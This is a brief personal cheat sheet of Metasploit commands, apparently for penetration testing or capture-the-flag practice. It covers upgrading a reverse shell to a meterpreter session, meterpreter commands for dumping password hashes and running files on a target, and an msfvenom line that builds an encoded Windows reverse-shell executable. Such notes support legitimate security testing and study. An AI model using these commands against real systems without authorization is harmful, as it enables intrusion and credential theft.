-----------------------------------------------
# Metasploit
Tags:  #Hacking #Cheatsheet #Tools 
Creation date: 2021-10-05

-----------------------------------------------


### Start Metasploit

```msfconsole -q```

### List sessions

```sessions```

### Search for and use module from nmap vuln scan

```search <vuln>```

```use <index>```

### Change reverse shell to metapreter shell

```use post/multi/manage/shell_to_metapreter```

```set session <session id of shell>```

Change to metapreter session:

```sessions -i <session id>```

#### Useful metapreter commands

```shell``` - Gain interactive shell on target box

```hashdump``` - Dump password hashes of users

```upload <src file> <dst file>``` - Upload file to target

```download <src file> <dst file>``` - Download file from target

```sysinfo``` - Get info on target box

```execute -f <file>``` - Execute file on target box

### Generate reverse shell as windows executable

```msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o <.exe>```